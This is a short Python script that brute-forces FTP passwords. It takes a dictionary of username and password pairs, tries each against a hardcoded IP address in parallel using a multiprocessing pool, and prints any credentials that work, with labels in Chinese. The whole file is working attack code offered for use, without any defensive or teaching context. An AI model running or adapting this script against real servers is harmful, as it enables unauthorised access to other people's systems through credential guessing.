#!/usr/bin/python3.4
# -*- coding=utf-8 -*-


import multiprocessing
from ftp_login import ftp_login_result
from ftp_login import ftp_login
from ftp_dict import ftpdict

def dos_ftp_passwd(ip,dict):
	ips_usernames_passwords = []
	for x in dict:
		ip_username_password = (ip, x[0], x[1])
		ips_usernames_passwords.append(ip_username_password)
	pool=multiprocessing.Pool(processes=5)

	#pool.map(ftp_login_result, ips_usernames_passwords)
	#or
	result = pool.map(ftp_login, ips_usernames_passwords)
	for x in result:
		if x[0] == 1:
			print('====================')
			print('服务器:' + x[1])
			print('用户名:' + x[2])
			print('密码为:' + x[3])
if __name__ == '__main__':
	dos_ftp_passwd('202.100.1.168', ftpdict)